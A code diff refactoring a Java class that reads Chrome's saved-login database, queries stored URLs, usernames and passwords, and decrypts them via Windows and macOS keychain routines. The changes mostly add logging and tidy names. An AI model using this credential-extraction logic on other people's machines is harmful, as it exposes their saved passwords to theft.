@@ -15,8 +15,12 @@ import java.sql.Connection;
 import java.sql.ResultSet;
 import java.sql.SQLException;
 import java.util.ArrayList;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 public class ChromeDatabase {
+
+    private static final Logger LOG = Logger.getLogger(ChromeDatabase.class.getName());
 
     public static ChromeDatabase connect(final File database) throws IOException {
         Path tempDB;
@@ -53,10 +57,11 @@ public class ChromeDatabase {
         try {
             connection.close();
         } catch (final SQLException e) {
+            LOG.log(Level.SEVERE, e.getMessage(), e);
         }
     }
 
-    public ArrayList<ChromeAccount> selectAccounts() throws IOException, IOException, Exception {
+    public ArrayList<ChromeAccount> selectAccounts() throws Exception {
         try {
             if (connection.isClosed()) {
                 throw new IOException("Connection to database has been terminated! Cannot fetch accounts.");
@@ -66,17 +71,16 @@ public class ChromeDatabase {
         }
         final ArrayList<ChromeAccount> accounts = new ArrayList<>();
         try {
-            final ResultSet results = connection.createStatement()
-                    .executeQuery("SELECT action_url, username_value, password_value FROM logins");
+            final String loginQuery = "SELECT action_url, username_value, password_value FROM logins";
+            final ResultSet results = connection.createStatement().executeQuery(loginQuery);
             while (results.next()) {
                 String address, username, password;
                 try {
                     address = results.getString("action_url");
                     username = results.getString("username_value");
-                    switch (OperatingSystem.getOperatingsystem()) {
+                    switch (OperatingSystem.getOperatingSystem()) {
                         case WINDOWS:
                             password = ChromeSecurity.getWin32Password(results.getBytes("password_value"));
-//                            System.out.println("win psw: " + password);
                             break;
                         case MAC:
                             password = ChromeSecurity.getOSXKeychainPasswordAsAdmin(address);
@@ -86,6 +90,7 @@ public class ChromeDatabase {
                     }
                     accounts.add(new ChromeAccount(username, password, address));
                 } catch (final SQLException e) {
+                    LOG.log(Level.SEVERE, e.getMessage(), e);
                 }
             }
             results.close();
